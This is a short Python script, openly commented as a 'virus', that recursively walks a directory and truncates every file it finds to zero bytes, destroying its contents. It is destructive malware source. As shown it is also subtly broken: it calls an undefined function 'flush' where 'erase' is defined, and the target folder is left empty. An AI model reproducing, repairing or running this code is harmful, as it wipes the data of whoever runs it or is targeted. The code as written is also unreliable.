#!/bin/python3
#Author:106_sam
import os

#This virus is going to erase data from any file present in the directory or Folder#It Corrupts the file and make it into 0 bytes
#erasing data of the file and the file gets corrputed

def erase(file):
    fp=open(file,"w")
    fp.close()

def cd(folder):
    files = os.listdir(folder)
    for item in files:
        temp=folder+"/"+item
        print(temp)
        if(os.path.isfile(temp)):
            flush(temp)
        else:
            cd(temp)

#example: folder="/tmp"

folder=""
cd(folder)
